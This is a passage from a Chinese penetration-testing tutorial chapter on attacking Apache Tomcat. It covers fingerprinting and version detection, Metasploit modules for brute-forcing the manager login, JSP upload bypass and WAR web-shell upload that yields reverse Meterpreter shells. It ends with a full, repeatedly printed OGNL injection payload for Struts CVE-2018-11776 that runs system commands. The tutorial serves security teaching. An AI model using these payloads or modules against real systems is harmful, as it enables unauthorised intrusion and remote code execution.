如果服务器以字节形式的序列化数据作为响应，以`ac ed`开头，我们可以运行利用，这将使我们通过 Meterpreter 访问服务器，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ac382d68-262d-44fb-9617-288a49170c09.png)**注意：**在我们无法获得成功的反向 shell 的情况下，我们总是可以选择绑定 shell 连接。

# 总结

在本章中，我们学习了 JBoss 的基础知识，然后继续学习文件和目录结构。接下来，我们研究了 JBoss 的枚举，然后进行了使用 Metasploit 框架进行漏洞评估，之后我们进行了通过管理控制台进行利用的过程。最后，我们通过 Web 控制台执行了利用。

在下一章中，我们将学习有关对 Apache Tomcat 进行渗透测试。

# 问题

JBoss 可以免费下载吗？

# 进一步阅读

JBoss 目录结构：

+   [`www.protechtraining.com/content/jboss_admin_tutorial-directory_structure`](https://www.protechtraining.com/content/jboss_admin_tutorial-directory_structure)

+   [`access.redhat.com/documentation/en-us/jboss_enterprise_application_platform/5/html/administration_and_configuration_guide/server_directory_structure`](https://access.redhat.com/documentation/en-us/jboss_enterprise_application_platform/5/html/administration_and_configuration_guide/server_directory_structure)

Java 序列化格式：

+   [`www.programering.com/a/MTN0UjNwATE.html`](https://www.programering.com/a/MTN0UjNwATE.html)

+   [`www.javaworld.com/article/2072752/the-java-serialization-algorithm-revealed.html`](https://www.javaworld.com/article/2072752/the-java-serialization-algorithm-revealed.html)


# 第十六章：技术平台的渗透测试- Apache Tomcat

在上一章中，我们学习了如何对**JBoss 应用服务器**（**JBoss AS**）进行渗透测试。现在让我们看看另一个技术平台，称为**Apache Tomcat**。Apache Tomcat 软件是在一个开放和参与的环境中开发的，并在 Apache 许可证第 2 版下发布。Apache Tomcat 是一个 Java Servlet 容器，实现了多个核心企业特性，包括 Java Servlets、**Java Server Pages**（**JSP**）、Java WebSocket 和**Java Persistence APIs**（**JPA**）。许多组织都有部署在 Apache Tomcat 上的基于 Java 的应用程序。易受攻击的 Apache Tomcat 软件对威胁行为者来说是一个金矿，因为许多支付网关、核心银行应用程序和**客户关系管理**（**CRM**）平台等都在 Apache Tomcat 上运行。

在本章中，我们将涵盖以下主题：

+   Tomcat 简介

+   Apache Tomcat 架构

+   文件及其目录结构

+   检测 Tomcat 安装

+   版本检测

+   对 Tomcat 进行利用

+   Apache Struts 简介

+   OGNL 简介

+   OGNL 表达式注入

# 技术要求

本章的先决条件如下：

+   Apache Tomcat ([`tomcat.apache.org/`](http://tomcat.apache.org/))

+   后端数据库；推荐使用 MySQL ([`www.mysql.com/downloads/`](https://www.mysql.com/downloads/))

+   Metasploit 框架 ([`github.com/rapid7/metasploit-framework`](https://github.com/rapid7/metasploit-framework))

# Tomcat 简介

Apache Tomcat 软件是一个开源的 Web 服务器，旨在运行基于 Java 的 Web 应用程序。当前版本的 Tomcat 的一些特性包括以下内容：

+   支持 Java Servlet 3.1

+   JSP 2.3

+   Java 统一**表达语言**（**EL**）3.0

+   Java WebSocket 1.0

Tomcat 是由许多开发人员在 Apache 项目平台的支持下开发和处理的，根据 Apache 认证 2.0 证书发布，并且是一个开源应用程序。Tomcat 可以作为一个独立产品使用，具有自己的内部 Web 服务器，也可以与其他 Web 服务器一起使用，包括 Apache 和 Microsoft 的**Internet Information Server**（**IIS**）。

鉴于 Apache Tomcat 被许多组织使用，应该明智地考虑这个平台的安全性。在撰写本书时，Shodan 已经确定了全球超过 93,000 个 Tomcat 实例（独立和集成在 JBoss 实例中），如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9513002f-fe30-487c-9f33-9b27c9f72d16.png)

Apache Tomcat 服务器内的漏洞可以允许威胁行为者利用服务器上运行的应用程序，甚至可以超越通用应用程序的利用，最终获取对组织内部网络的访问权限。

# Apache Tomcat 架构

Tomcat 可以被描述为一系列不同的功能组件，这些组件根据明确定义的规则组合在一起。以下图表代表了 Tomcat 的结构：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/77b8d094-f942-4e64-a988-a1b220bf7e29.png)

让我们试着理解前面图表中显示的每个组件的作用：

+   **服务器**：服务器代表整个 Catalina Servlet 容器。`server.xml`文件代表 Tomcat 安装的所有特性和配置。

+   **服务**：服务是服务器内部包含连接器的组件，这些连接器共享单个容器来处理它们的传入请求。

+   **引擎**：引擎接收并处理来自不同连接器的信息，并返回输出。

+   **主机**：这是服务器使用的网络或域名。一个服务器可以有多个主机。

+   **上下文**：表示 Web 应用程序。在主机上可以有多个具有不同 URL 路径的 Web 应用程序。

+   **连接器**：连接器处理客户端和服务器之间的通信。有不同类型的连接器用于处理各种通信；例如，HTTP 连接器用于处理 HTTP 流量，而 AJP 连接器用于使用 AJP 协议与 Apache 通信。

现在我们对 Apache Tomcat 架构有了基本的了解，让我们来看看 Tomcat 服务器上存储的文件和目录的结构。

# 文件及其目录结构

Tomcat 的文件和目录结构与我们在上一章中讨论的 JBoss 类似。在本节中，我们将快速浏览 Tomcat 的目录结构，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8f354275-d7bb-48f2-b3a9-12da7f48941f.png)

Tomcat 目录中的子目录可以解释如下：

+   `bin`：此目录包含服务器初始化时所需的所有脚本，如启动和关闭脚本以及可执行文件。

+   `common`：这个目录包含 Catalina 和开发人员托管的其他 Web 应用程序可以使用的公共类。

+   `conf`：这个目录包含用于配置 Tomcat 的服务器 XML 文件和相关的**文档类型定义**（**DTD**）。

+   `logs`：这个目录，顾名思义，存储了 Catalina 和应用程序生成的日志。

+   `server`：这个目录存储仅由 Catalina 使用的类。

+   `shared`：这个目录存储可以被所有 Web 应用程序共享的类。

+   `webapps`：这个目录包含所有的 Web 应用程序。

+   `work`：这个目录代表文件和目录的临时存储。

最有趣的目录之一是`webapps`目录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b346e96d-e530-4b8d-8178-bb91f416e01a.png)

通过导航到`webapps`目录并列出内容，我们可以查看目录，如前面的屏幕截图所示：

+   `ROOT`：这是 Web 应用程序的根目录。它包含所有的 JSP 文件和 HTML 页面，客户端 JAR 文件等。

+   `docs`：此目录包含 Apache Tomcat 的文档。

+   `examples`：`examples`文件夹包含 Servlet、JSP 和 WebSocket 示例，以帮助开发人员进行开发。

+   `host-manager`：`host-manager`应用程序允许我们在 Tomcat 中创建、删除和管理虚拟主机。这个目录包含了这个应用程序的代码。

+   `manager`：`manager`允许我们管理安装在 Apache Tomcat 实例上的 Web 应用程序，以**Web 应用程序存档**（**WAR**）文件的形式。

对文件和目录结构的清晰理解可以帮助我们在目标 Tomcat 服务器上进行非常有效的侦察。

# 检测 Tomcat 安装

现在，让我们看看如何检测服务器上是否安装了 Tomcat，以及可以用于进一步侦察的常见检测技术。

# 通过 HTTP 响应头检测 - X-Powered-By

检测 Apache Tomcat 安装的一种常见方法是查看服务器响应中的`X-Powered-By` HTTP 头：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/fbdedd9c-6fec-4c58-a31a-33c9fc3e7a79.png)

典型的安装将在 HTTP 响应头中给出 Apache Tomcat 版本。

# 通过 HTTP 响应头检测 - WWW-Authenticate

检测 Tomcat 的一种简单方法是请求`/manager/html`页面。一旦您发出请求，服务器将以 HTTP 代码`401 未经授权`回复，并附带`WWW-Authenticate` HTTP 头：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/22bbe6a0-3f39-4392-bfe0-033f5e68783f.png)

如前面的屏幕截图所示，这个特定的头部将设置为`Tomcat Manager Application`字符串，通过使用这个头部，我们将能够检测目标服务器是否安装了 Tomcat。

# 通过 HTML 标签检测 - 标题标签

如果您在打开 Tomcat 实例时看到一个空白页面，您仍然可以通过查看 HTML `<title>`标签来检测它是否是 Tomcat 页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c882c6ce-2563-4c74-861f-2d7381b9df58.png)

`Apache Tomcat`字符串在`<title>`标签之间提到，就像前面的截图中一样。

# 通过 HTTP 401 未经授权错误检测

Tomcat 安装通常使用 Tomcat Manager Web 应用程序来管理和部署 Web 应用程序。它可以通过`URL/manager/html`访问。这会产生一个 HTTP 身份验证面板：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c5bcd2ac-93ad-4899-880d-df7e28fe05b6.png)

单击弹出窗口上的“取消”将给您一个 401 错误，就像前面的截图中一样，这证实了 Tomcat 的存在。

**注意：**这种信息披露只存在于 Tomcat 服务器配置错误的情况下。

# 通过唯一指纹（哈希）检测

我们在之前的章节中看到，大多数 Web 应用程序可以通过它们的 favicon 来检测。可以比较不同版本的 favicon 的`md5`哈希来识别正在使用的 Tomcat 的版本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/be8b900c-7057-446d-b034-e5a79e062c6c.png)

以下截图显示了 OWASP favicon 数据库列表中的哈希：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2b93069a-f8d5-4231-8596-b4f30d3617a9.png)

我们还可以维护我们的 favicon 数据库，以检查不同版本的 Apache Tomcat 安装。

# 通过目录和文件检测

安装时，Apache Tomcat 还创建了`docs`和`examples`目录，以帮助开发人员进行应用程序开发和部署。默认情况下，文件夹的 URI 如下：

+   `/docs/`

+   `/examples/`

我们还可以使用 SecLists ([`github.com/danielmiessler/SecLists`](https://github.com/danielmiessler/SecLists))来枚举 Tomcat 中的敏感文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3ea0aab5-2608-482e-a656-6dcf05d30e22.png)

前面的截图显示了可以用来识别安装了 Tomcat 的实例的不同文件和文件夹。在下一节中，我们将解决如何识别 Tomcat 安装的版本号。

# 版本检测

一旦我们确认服务器正在运行 Tomcat，下一步是建立版本信息。在本节中，我们将看一些检测现有 Tomcat 安装的版本号的方法。

# 通过 HTTP 404 错误页面检测版本

默认情况下，Tomcat 的 404 错误页面会披露它正在运行的版本号，所以我们只需要访问服务器上不存在的 URL，服务器应该会返回一个错误页面，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d47dc1bc-db8a-4acf-b8a6-da4d9d2878cd.png)

许多管理员实际上并没有隐藏披露版本号的 Web 服务器横幅。攻击者可以利用这些信息从其库中找到公开或零日利用来访问服务器。

# 通过 Release-Notes.txt 披露版本信息

Tomcat 还有一个`Release-Notes.txt`文件，其中包含有关该版本的增强功能和已知问题的详细信息。该文件还向威胁行为者披露了 Apache Tomcat 服务器的版本号：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/05ebf851-7f60-4f71-b4be-379cb005df55.png)

发布说明的第一行包含版本信息，就像前面的截图中一样。

# 通过 Changelog.html 披露版本信息

除了`Release-Notes.txt`之外，还有一个`Changelog.html`文件，该文件在页面上披露了版本号，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5da165be-331d-4ad7-862a-791654af70c3.png)

现在我们可以继续下一步，即利用 Tomcat 安装。

# 利用 Tomcat

在本节中，我们将看一下如何执行对 Tomcat 的易受攻击版本的利用。我们将涵盖各种技术，包括上传`WAR shell`和 JSP 上传绕过。

在 Metasploit 上使用`search`命令查找 Tomcat 将为我们提供一些可用的模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/40376757-444e-4a08-8914-36fd552d9b6e.png)

我们将使用最基本的模块，它将暴力破解 Tomcat Manager 并给我们凭据：

1.  要加载模块，我们可以使用以下命令：

```
use auxiliary/scanner/http/tomcat_mgr_login
```

1.  在使用模块之前，了解模块的工作原理总是一个好习惯。牢记这一点，渗透测试人员可以在有**Web 应用程序防火墙**（**WAF**）的情况下调整模块。模块加载后，我们可以使用`show options`命令来查看测试人员需要填写的选项（如下截图所示）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/db3b7a9d-2350-47af-aa2d-648e90e9a84b.png)

1.  通过查看选项，我们可以看到它要求填写 Tomcat 安装的 IP（`RHOSTS`）和端口（`RPORT`），以及用于暴力破解凭据的字典。我们使用`run`命令来执行模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0fe596bb-26b5-42c3-bc6e-4ba4c456c207.png)

1.  我们将得到一个正确的登录/密码组合的`登录成功`消息，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/46cbd940-773d-4fd6-a513-5b5ccbe36865.png)

利用默认密码漏洞访问服务器是利用 Apache Tomcat 的最常见方式之一。如果攻击者使用默认密码获得访问权限，甚至不需要花费大量精力来查找不同的易受攻击的端点。

# Apache Tomcat JSP 上传绕过漏洞

影响 Tomcat 7.x、8.x 和 9.x 以及 TomEE 1.x 和 7.x 的 JSP 上传绕过漏洞。该漏洞涉及使用`PUT`方法绕过文件名过滤器上传 JSP 文件。此外，Metasploit 模块也可用于此漏洞利用。让我们通过执行以下命令来使用该模块：

```
use exploit/multi/http/tomcat_jsp_upload_bypass
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/54de054f-69e8-4449-b50c-29a507d73222.png)

设置`RHOSTS`值并使用`run`命令执行模块如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3f4f2d5f-53f2-4911-899a-4f4b9a293256.png)

正如您在以下截图中所看到的，这个 Metasploit 模块将首先使用 HTTP 的`PUT`方法来上传一个带有`.jsp`扩展名后面跟着`/`（斜杠）的 JSP 文件。如果 Apache Tomcat 实例以 HTTP `201`（已创建）代码回应，这意味着文件已成功上传到服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5b73533e-699d-4ee1-9559-b081338e1365.png)

文件被上传的原因是 Tomcat 服务器存在文件上传限制漏洞（仅限特定版本），如果文件扩展名为 JSP，则会过滤文件。使用这个斜杠，我们可以绕过这个限制来上传一个恶意的基于 JSP 的 Web shell。在这种情况下，有效载荷文件被使用`PUT`方法发送到目标服务器，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/606bfda9-ee7a-4b36-9752-9c12c3603f48.png)

如前所述，在成功上传的情况下，服务器将返回 HTTP `201`代码。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/575c984c-7d7f-4e6d-871a-4ed7f48389d6.png)

一旦有效载荷文件被上传，Metasploit 模块将请求相同的文件名来执行我们的有效载荷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/765ec831-955b-4e9b-95ec-7a92404991f7.png)

成功执行有效载荷后，我们将得到一个通用 shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1eed01bb-bbc6-4e45-b145-38feaef1c8ac.png)

在利用 JSP 上传绕过后，我们并不总是需要获得`root`（特权）shell。还有更多的情况需要我们从普通用户升级到`root`。

# Tomcat WAR shell 上传（经过身份验证）

假设我们有 Apache Tomcat 实例的凭据（可能是通过窃听/嗅探或从包含敏感信息的文件中获得）。用户可以通过将打包的 WAR 文件上传到 Apache Tomcat 实例来运行 Web 应用程序。在本节中，我们将上传一个 WAR 文件以获得绑定/反向 shell 连接。请注意，WAR shell 上传需要身份验证才能工作；否则，服务器将以 HTTP `401`（未经授权）代码回应：

1.  首先，让我们请求`/manager/html`页面。服务器将要求进行 HTTP 身份验证：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7370f154-d965-4538-ab20-af95a602c618.png)

1.  一旦经过身份验证，页面将被重定向到`/manager/status`，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/cea1d303-f1bd-4111-9aa4-1746d38822f3.png)

1.  单击“列出应用程序”将列出由此 Apache Tomcat 实例管理的所有已安装应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2d368d15-cb67-40ca-8b20-ddfdeeef971c.png)

1.  在同一页向下滚动，我们会找到一个“部署”部分，在这里我们可以通过 URL 部署服务器上的 WAR，或者通过上传我们自己的 WAR 文件来部署：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/128cdbc8-cc17-4905-bf31-b0ad7fcdd62b.png)

1.  我们可以从页面的 WAR 文件部署部分向服务器上传 WAR 文件（`redteam.war`）。单击“部署”按钮将部署我们的 WAR 文件。在成功部署 WAR 后，我们的应用程序将安装在 Apache Tomcat 服务器上，我们可以从“列出应用程序”选项中查看（如前所述）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/fe60cb40-a7dc-44df-a592-17b47e8b0b09.png)

1.  在上面的屏幕截图中，我们的 WAR 文件已部署。现在，我们只需要正常从浏览器访问我们的 JSP shell，并将要执行的命令作为参数的值传递（如下图所示）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5d459ca1-acfa-429e-a31d-ccf42e1d4af2.png)

使用 Metasploit 也可以实现相同的过程。使用 Metasploit 中的`tomcat_mgr_upload`模块，我们可以上传一个 WAR shell。让我们通过在`msfconsole`中执行以下命令来使用这个模块：

```
use exploit/multi/http/tomcat_mgr_upload
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9fb439e1-dad9-4ef8-831d-637c0f9df625.png)

由于这是一个经过身份验证的机制，我们需要提供 HTTP 身份验证的凭据。让我们执行这个模块，以便 Metasploit 可以上传 WAR 文件并在服务器上执行有效载荷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f8438f5e-4edb-4880-885d-256f004c2489.png)

如前面的屏幕截图所示，模块已成功通过服务器进行了身份验证，并上传了一个 WAR 文件（`ymRRnwH.war`）。上传后，模块调用了 WAR 文件中打包的 JSP 有效载荷，并执行它以获得反向`meterpreter`连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ec62a8d7-cd3e-4d0d-8f62-109538f30387.png)

在执行`tomcat_mgr_upload`模块时，`meterpreter`检查以下步骤：

1.  Metasploit 模块检查凭据是否有效。

1.  如果它们是有效的，模块将从服务器响应中获取`org.apache.catalina.filters.CSRF_NONCE`的值（CSRF 令牌）。

1.  然后，该模块尝试通过 HTTP `POST`方法（无需身份验证）上传 WAR 有效载荷。

1.  如果前面的步骤失败，模块将使用提供的凭据上传 WAR 文件（`POST/manager/html/upload`）。

1.  上传成功后，模块将从服务器请求 JSP `meterpreter`文件，导致打开了`meterpreter`连接（在这种情况下是一个反向连接）。

**注意：**

我们已经上传并执行了`meterpreter` shell 以获得反向连接。有些情况下，反向连接是不可能的。在这些情况下，我们可以总是寻找绑定连接，或者通过 HTTP 隧道`meterpreter`会话。 

现在我们知道了如何将 WAR shell 上传到 Apache Tomcat 实例，以及如何利用一些漏洞，让我们继续进行对 Apache Tomcat 实例执行的攻击的下一级别。

# Apache Struts 简介

Apache Struts 是一个免费的开源框架，遵循 MVC 架构，用于开发基于 Java 的 Web 应用程序。它使用 Java Servlet API。它最初是由 Craig McClanahan 创建的，并于 2000 年 5 月捐赠给 Apache 基金会。Apache Struts 2 的第一个完整版本发布于 2007 年。

在本节中，我们将看一下 Apache Struts 中发现的一些漏洞。

# 了解 OGNL

**对象图标记语言**（**OGNL**）是一种 EL，它简化了存储在`ActionContext`中的数据的可访问性。`ActionContext`是一个包含了执行操作所需的对象的容器。OGNL 在 Apache Struts 2 中有很强的关联，并用于将表单参数存储为 ValueStack 中的 Java Bean 变量。**ValueStack**是一个存储区，用于存储数据以处理客户端请求。

# OGNL 表达式注入

当未经过滤的用户输入传递给 ValueStack 进行评估时，就会发生 OGNL 表达式注入。在本节中，我们将尝试理解表达式注入查询，并查看一个利用示例。

以下屏幕截图显示了一个使用 Struts 2 的易受攻击的 Web 应用程序的示例，该应用程序易受 CVE-2018-11776 的攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8b675680-5015-40e8-be8c-7575ec7d8650.png)

让我们尝试手动利用这个 Struts 漏洞（CVE-2018-11776），采取以下步骤：

1.  当您转到菜单栏中的 Configuration | Action Chaining 时，您会注意到以下请求被发送到服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3fcea68a-a0ef-4981-bfaf-af1b1b3cd15f.png)

1.  然后服务器返回以下响应：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/832d68b3-c34d-4b7b-8707-64e85ba8fc3c.png)

1.  现在，我们将`actionchaining`字符串替换为其他内容，例如`Testing123`，就像我们在以下屏幕截图中所做的那样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5dfeff27-99b7-4d10-8998-77d9c43138ef.png)

1.  当我们这样做时，服务器会处理我们的`Testing123`字符串，并用相同的字符串做出响应：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e2d6107e-672a-4815-8e8d-625244797946.png)

1.  要测试诸如 OGNL 之类的表达式语言注入，我们需要使用`${..}`或`%{..}`语法。OGNL 将处理包含在`${..}`或`%{..}`中的任何内容。因此，为了进行简单的测试，让我们使用`${123*123}`或`%{123*123}`字符串：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/22f2e91b-a078-4f9f-8287-983fd56ca758.png)

1.  由于代码位于以`$`或`%`开头的括号中，服务器将其处理为 OGNL 表达式，并以以下屏幕截图中显示的结果做出响应：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/081adc0f-5dc1-4a35-8c6f-cf95e6b9f3c6.png)

现在我们已经成功确认了前面测试案例中的漏洞，让我们了解如何在执行进程上进行 OGNL 注入时，如何注入有效负载并绕过沙箱（如果有的话）。

# 测试 OGNL 注入的远程代码执行

为了测试漏洞，我们将使用以下有效负载：

```
${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

在分解有效负载之前，让我们了解一些关于 OGNL 的东西，这将帮助我们更好地理解有效负载：

| **运算符** | **描述** |
| --- | --- |
| `${..}` or `%{..}` | 一个 OGNL 表达式块。 |
| `(e)` | 一个带括号的表达式。 |
| `e.method(args)` | 方法调用的语法。 |
| `e.property` | 调用属性的语法。 |
| `e1[e2]` | 数组索引。 |
| `[e]` | 数组索引引用。 |
| `#variable` | 上下文变量引用。 |
| `@class@method(args)` | 静态方法引用。 |
| `{e1,e2,e3,..}` | 列表创建-逗号（`,`）的用法与分号（`;`）相同，用于结束语句。 |
| `e1.(e2)` | 子表达式评估。 |

现在，让我们通过参考前面的表来分解先前提到的有效负载。

在以前的 Struts 版本中，`_memberAccess`对象用于控制 OGNL 的操作，但在后来的版本中，`_memberAccess`对象甚至受到了对构造函数调用的限制。这是由于`excludedClasses`、`excludedPackageNames`和`excludedPackageNamePatterns`黑名单，拒绝访问特定的类和包。即使`_memberAccess`对象是可访问的，对该对象也施加了严格的限制。

要绕过这样的限制，在 Struts 版本 2.3.20-2.3.29 中，我们只需用`DefaultMemberAccess`对象（`SecurityMemberAccess`类中的可访问静态对象）替换`_memberAccess`对象，这将允许我们控制 OGNL 的操作而没有任何限制。

因此，负载的第一行用于通过将上下文从`_memberAccess`更改为`DefaultMemberAccess`来绕过对`_memberAccess`对象的限制：

```
${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

在上述代码中，`OgnlContext`是一个类，根据 Apache Common OGNL 表达式参考（[`commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/OgnlContext.html`](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/OgnlContext.html)）定义了 OGNL 表达式的执行上下文。

现在上下文已从`_memberAccess`更改为`DefaultMemberAccess`，我们可以使用`setMemberAccess`方法设置`MemberAccess`。但是，为了访问对象，我们首先需要清除黑名单（`excludedClasses`、`excludedPackageNames`和`excludedPackageNamePatterns`）。我们可以通过恢复到原始上下文来清除黑名单，如我们负载的下一行突出显示所示：

```
${(*#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS*).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

由于我们还没有上下文，我们需要检索上下文映射，可以通过访问`ActionContext.container`来完成。现在可以访问此容器，因为我们已经从`struts.valueStack`请求了上下文。请参考我们负载的以下突出显示行：

```
${(*#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS*).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

现在我们已经可以访问上下文映射（请参考我们负载的第一行突出显示），我们现在可以清除黑名单，以便访问`DefaultMemberAccess`对象，该对象没有限制。我们的负载的第二行突出显示行就是这样做的：

```
${(*#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS*).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

一旦`clear()`方法被处理并且我们已经清除了黑名单，我们现在可以使用`setMemberAccess()`方法设置为`DEFAULT_MEMBER_ACCESS`来设置`MemberAccess`。请参考负载中的以下突出显示文本：

```
${(*#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS*).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

现在我们已经可以访问`DEFAULT_MEMBER_ACCESS`对象，我们可以从 Java 常用实用程序包中调用任何类、方法和对象来在 OGNL 中运行。在这种情况下，我们将使用`Runtime().exec()`方法来执行我们的命令（`#a=@java.lang.Runtime@getRuntime().exec('id')`），并且为了在响应中打印命令执行输出，我们将使用`getinputStream()`方法，如负载的最后两行所示：

```
${(*#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS*).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

现在我们对负载有了更好的理解，让我们在请求中使用负载，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ef923dc9-8c88-4f0f-8edf-f4acfbecf143.png)

